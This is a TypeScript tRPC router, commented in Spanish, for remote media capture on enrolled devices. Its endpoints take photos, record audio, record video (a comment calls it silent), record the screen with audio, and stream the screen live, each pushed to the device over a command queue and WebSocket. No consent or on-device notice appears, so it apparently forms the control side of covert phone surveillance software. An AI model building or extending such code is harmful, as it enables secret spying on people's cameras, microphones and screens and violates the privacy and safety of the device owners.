import { z } from "zod";
import { router, protectedProcedure } from "../_core/trpc";
import { TRPCError } from "@trpc/server";
import { RemoteCommandType, createRemoteCommand, commandQueue, logRemoteCommand } from "../remoteControl";

export const mediaCaptureRouter = router({
  /**
   * Tomar una foto remota
   */
  takePhoto: protectedProcedure
    .input(
      z.object({
        deviceId: z.number(),
        camera: z.enum(["front", "back"]).default("back"),
        flash: z.boolean().default(false),
      })
    )
    .mutation(async ({ input, ctx }) => {
      try {
        const command = createRemoteCommand(
          input.deviceId,
          ctx.user.id,
          RemoteCommandType.TAKE_PHOTO,
          { camera: input.camera, flash: input.flash },
          "high"
        );

        commandQueue.enqueue(command);
        await logRemoteCommand(ctx.user.id, input.deviceId, RemoteCommandType.TAKE_PHOTO, "success", { commandId: command.commandId });

        // [ADM FIX] Direct WebSocket broadcast
        const { getWebSocketManager } = await import("../websocket");
        const wsManager = getWebSocketManager();
        if (wsManager) {
          wsManager.broadcastToDevice(input.deviceId, "execute-command", {
            action: RemoteCommandType.TAKE_PHOTO,
            commandId: command.commandId,
            payload: { camera: input.camera, flash: input.flash }
          });
        }

        return { success: true, commandId: command.commandId, message: "Comando de captura de foto enviado" };
      } catch (error) {
        console.error("[MediaCapture] Error:", error);
        throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Error al enviar comando de foto" });
      }
    }),

  /**
   * Iniciar grabación de audio
   */
  recordAudio: protectedProcedure
    .input(
      z.object({
        deviceId: z.number(),
        durationSeconds: z.number().min(1).max(300).default(30),
      })
    )
    .mutation(async ({ input, ctx }) => {
      try {
        const command = createRemoteCommand(
          input.deviceId,
          ctx.user.id,
          RemoteCommandType.START_AUDIO_RECORDING,
          { duration: input.durationSeconds },
          "high"
        );

        commandQueue.enqueue(command);
        await logRemoteCommand(ctx.user.id, input.deviceId, RemoteCommandType.START_AUDIO_RECORDING, "success", { commandId: command.commandId });

        // [ADM FIX] Direct WebSocket broadcast
        const { getWebSocketManager } = await import("../websocket");
        const wsManager = getWebSocketManager();
        if (wsManager) {
          wsManager.broadcastToDevice(input.deviceId, "execute-command", {
            action: RemoteCommandType.START_AUDIO_RECORDING,
            commandId: command.commandId,
            payload: { duration: input.durationSeconds }
          });
        }

        return { success: true, commandId: command.commandId, message: "Grabación de audio iniciada" };
      } catch (error) {
        console.error("[MediaCapture] Error:", error);
        throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Error al iniciar grabación de audio" });
      }
    }),

  /**
   * Detener cualquier grabación en curso
   */
  stopRecording: protectedProcedure
    .input(
      z.object({
        deviceId: z.number(),
        type: z.enum(["audio", "video"]),
      })
    )
    .mutation(async ({ input, ctx }) => {
      const commandType = input.type === "audio" 
        ? RemoteCommandType.STOP_AUDIO_RECORDING 
        : RemoteCommandType.STOP_VIDEO_RECORDING;

      try {
        const command = createRemoteCommand(
          input.deviceId,
          ctx.user.id,
          commandType,
          {},
          "high"
        );

        commandQueue.enqueue(command);
        return { success: true, commandId: command.commandId };
      } catch (error) {
        throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Error al detener grabación" });
      }
    }),

  /**
   * Iniciar grabación de video (Silenciosa)
   */
  recordVideo: protectedProcedure
    .input(
      z.object({
        deviceId: z.number(),
        camera: z.enum(["front", "back"]).default("back"),
        durationSeconds: z.number().min(1).max(60).default(10),
      })
    )
    .mutation(async ({ input, ctx }) => {
      try {
        const command = createRemoteCommand(
          input.deviceId,
          ctx.user.id,
          RemoteCommandType.START_VIDEO_RECORDING,
          { camera: input.camera, duration: input.durationSeconds },
          "high"
        );

        commandQueue.enqueue(command);
        
        // [ADM FIX] Direct WebSocket broadcast
        const { getWebSocketManager } = await import("../websocket");
        const wsManager = getWebSocketManager();
        if (wsManager) {
          wsManager.broadcastToDevice(input.deviceId, "execute-command", {
            action: RemoteCommandType.START_VIDEO_RECORDING,
            commandId: command.commandId,
            payload: { camera: input.camera, duration: input.durationSeconds }
          });
        }

        return { success: true, commandId: command.commandId, message: "Grabación de video iniciada" };
      } catch (error) {
        throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Error al iniciar video" });
      }
    }),

  /**
   * Iniciar grabación de pantalla del dispositivo
   */
  startScreenRecording: protectedProcedure
    .input(
      z.object({
        deviceId: z.number(),
        durationSeconds: z.number().min(5).max(600).default(30),
        audio: z.boolean().default(true),
        quality: z.enum(["low", "medium", "high"]).default("high"),
      })
    )
    .mutation(async ({ input, ctx }) => {
      try {
        const command = createRemoteCommand(
          input.deviceId,
          ctx.user.id,
          RemoteCommandType.START_SCREEN_RECORDING,
          { duration: input.durationSeconds, audio: input.audio, quality: input.quality },
          "high"
        );

        commandQueue.enqueue(command);
        await logRemoteCommand(ctx.user.id, input.deviceId, RemoteCommandType.START_SCREEN_RECORDING, "success", { 
          commandId: command.commandId, 
          duration: input.durationSeconds,
          audio: input.audio,
          quality: input.quality 
        });

        const { getWebSocketManager } = await import("../websocket");
        const wsManager = getWebSocketManager();
        if (wsManager) {
          wsManager.broadcastToDevice(input.deviceId, "execute-command", {
            action: RemoteCommandType.START_SCREEN_RECORDING,
            commandId: command.commandId,
            payload: { duration: input.durationSeconds, audio: input.audio, quality: input.quality }
          });
        }

        return { 
          success: true, 
          commandId: command.commandId, 
          message: `Grabación de pantalla iniciada (${input.durationSeconds}s)` 
        };
      } catch (error) {
        console.error("[MediaCapture] Screen recording error:", error);
        throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Error al iniciar grabación de pantalla" });
      }
    }),

  /**
   * Detener grabación de pantalla
   */
  stopScreenRecording: protectedProcedure
    .input(z.object({ deviceId: z.number() }))
    .mutation(async ({ input, ctx }) => {
      try {
        const command = createRemoteCommand(
          input.deviceId,
          ctx.user.id,
          RemoteCommandType.STOP_SCREEN_RECORDING,
          {},
          "high"
        );

        commandQueue.enqueue(command);
        await logRemoteCommand(ctx.user.id, input.deviceId, RemoteCommandType.STOP_SCREEN_RECORDING, "success", { 
          commandId: command.commandId 
        });

        const { getWebSocketManager } = await import("../websocket");
        const wsManager = getWebSocketManager();
        if (wsManager) {
          wsManager.broadcastToDevice(input.deviceId, "execute-command", {
            action: RemoteCommandType.STOP_SCREEN_RECORDING,
            commandId: command.commandId,
            payload: {}
          });
        }

        return { success: true, commandId: command.commandId, message: "Grabación de pantalla finalizada" };
      } catch (error) {
        throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Error al detener grabación" });
      }
    }),

  /**
   * Iniciar streaming de pantalla en tiempo real
   */
  startScreenStream: protectedProcedure
    .input(
      z.object({
        deviceId: z.number(),
        quality: z.enum(["low", "medium", "high"]).default("medium"),
        fps: z.number().min(1).max(30).default(15),
      })
    )
    .mutation(async ({ input, ctx }) => {
      try {
        const command = createRemoteCommand(
          input.deviceId,
          ctx.user.id,
          RemoteCommandType.START_SCREEN_STREAM,
          { quality: input.quality, fps: input.fps },
          "critical"
        );

        commandQueue.enqueue(command);
        await logRemoteCommand(ctx.user.id, input.deviceId, RemoteCommandType.START_SCREEN_STREAM, "success", { 
          commandId: command.commandId,
          quality: input.quality,
          fps: input.fps
        });

        const { getWebSocketManager } = await import("../websocket");
        const wsManager = getWebSocketManager();
        if (wsManager) {
          wsManager.broadcastToDevice(input.deviceId, "execute-command", {
            action: RemoteCommandType.START_SCREEN_STREAM,
            commandId: command.commandId,
            payload: { quality: input.quality, fps: input.fps }
          });
        }

        return { 
          success: true, 
          commandId: command.commandId, 
          streamUrl: `/api/stream/${input.deviceId}`,
          message: "Streaming de pantalla iniciado" 
        };
      } catch (error) {
        throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Error al iniciar streaming" });
      }
    }),

  /**
   * Obtener estado de grabaciones activas
   */
  getRecordingStatus: protectedProcedure
    .input(z.object({ deviceId: z.number() }))
    .query(async ({ input, ctx }) => {
      const activeRecordings: string[] = [];
      const deviceQueue = commandQueue.getDeviceQueue(input.deviceId);
      
      for (const cmd of deviceQueue) {
        if (cmd && (cmd.status === "executing" || cmd.status === "sent")) {
          if (cmd.type.includes("recording") || cmd.type.includes("stream")) {
            activeRecordings.push(cmd.type);
          }
        }
      }

      return {
        deviceId: input.deviceId,
        activeRecordings,
        hasActiveRecording: activeRecordings.length > 0,
      };
    }),
});
